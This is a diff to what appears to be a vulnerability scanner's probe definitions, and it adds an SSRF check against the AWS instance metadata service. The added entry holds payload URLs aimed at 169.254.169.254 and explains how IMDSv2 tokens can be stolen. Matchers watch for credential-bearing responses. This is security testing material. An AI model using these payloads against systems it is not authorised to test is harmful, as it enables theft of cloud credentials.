@@ -680,6 +680,44 @@
           ]
         }
       ]
+    },
+    "ssrf_aws_metadata_imdsv2": {
+      "description": "SSRF \u2192 AWS IMDSv2 token theft. IMDSv2 requires a PUT to /latest/api/token with a TTL header, then a GET with the token. If the SSRF allows method control and custom headers, IMDSv2 is bypassed. Without method control, only IMDSv1 (direct GET) works. Common in cloud-hosted web apps behind ALB/CloudFront.",
+      "tech_match": [
+        "aws",
+        "ec2",
+        "lambda",
+        "ecs",
+        "fargate"
+      ],
+      "probes": [
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/",
+          "description": "IMDSv1 direct GET \u2014 if accessible, no token needed (legacy config)",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "instance-type",
+                "security-credentials"
+              ]
+            }
+          ]
+        },
+        {
+          "payload": "http://169.254.169.254/latest/api/token",
+          "description": "IMDSv2 token endpoint \u2014 requires PUT method + X-aws-ec2-metadata-token-ttl-seconds header",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "[A-Za-z0-9+/=]{20,}"
+            }
+          ],
+          "reference_only": true
+        }
+      ]
     }
   },
   "craft_guidance": [
